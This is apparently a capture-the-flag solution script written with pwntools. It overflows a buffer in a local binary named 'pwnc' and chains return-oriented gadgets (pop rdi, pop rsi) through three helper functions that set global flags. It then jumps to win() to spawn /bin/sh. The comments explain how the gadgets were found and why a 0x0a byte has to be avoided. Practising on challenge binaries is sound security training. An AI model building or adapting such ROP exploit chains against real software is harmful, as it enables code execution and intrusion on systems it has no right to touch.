#!/bin/python3

from pwn import *
context(arch="amd64")

p = process("./pwnc")

# Here, the address of win() is 0x401209: in order to execute system('/bin/sh'), variables 'a' 'b' 'c' must be set to 1 by respectively 'holala()' 'holblb()' and 'holclc()' funcs
# So, we must first call those 3 hol*l*() and satisfy the constraints they're asking for so that a/b/c variables are correctly set to 1!

# (1) Let's start with holclc() and 'c': we must start with this one prior to jump to holblb(), because holblb() needs 'c' global var NOT to be set to 0
# And holclc() sets 'c' global var to 1, so thanks to this function we should be able to call correctly holblb() after
# Constraints for holclc(): 'EDI == 4' and 'global var a != 1' (so as 'a' is initialized to 0 we can directly call holclc)

payload = b'A' * 24
payload += p64(0x4012eb) # pop rdi; ret; (we'll explain how we found this gadget just after that)
payload += p64(0x4) # pop 0x4 (decimal 4) to RDI
payload += p64(0x401142) # jump to holclc()

# (2) Let's continue with holala() and 'a': constraint is '(EDI * ESI) == 0x78' (decimal 120), so we just have to control EDI and ESI values and set for example EDI to 0x78 (dec 120) and ESI to 0x1 (dec 1)
# First stupid / beginner mistake I made is set EDI to 0xc (dec 12) and ESI to 0xa (dec 10) so that result == 120: but as 0xa is a "\n" character, gets() will stop reading the rest of the payload, so you ABSOLUTELY MUST AVOID using a byte "0x0a" in your payload!

# holala() address is 0x4011cb
# To control EDI we use this command and find this gadget: ropper -f pwnc |grep "rdi" --> 0x4012eb: pop rdi; ret;
# And for ESI: ropper -f pwnc |grep "rsi" --> 0x4012e9: pop rsi; pop r15; ret; (R15 register will be also set to a random value that we'll assign it, but that doesn't matter)

payload += p64(0x4012eb) # pop rdi; ret;
payload += p64(0x78) # pop 0x78 (decimal 120) to RDI

payload += p64(0x4012e9) # pop rsi; pop r15; ret;
payload += p64(0x1) # pop 0x1 (decimal 1) to RSI
payload += p64(0x0) # (doesn't matter) pop 0x0 to R15 (but we could set any value as we don't care about this register)

payload += p64(0x4011cb) # jump to holala()

# (3) Now let's finish with holblb() and 'b': constraint is 'EDI == 0x18' and 'global var c != 0' (so we can use 'global var c == 1' thanks to previous call to holclc)

payload += p64(0x4012eb) # pop rdi; ret;
payload += p64(0x18) # pop 0x18 to RDI
payload += p64(0x401185) # jump to holblb()

# (4) We can jump to win() now that 'a', 'b' and 'c' are correctly set

payload += p64(0x401209)

p.sendline(payload)
print(p.recvline())
p.interactive()
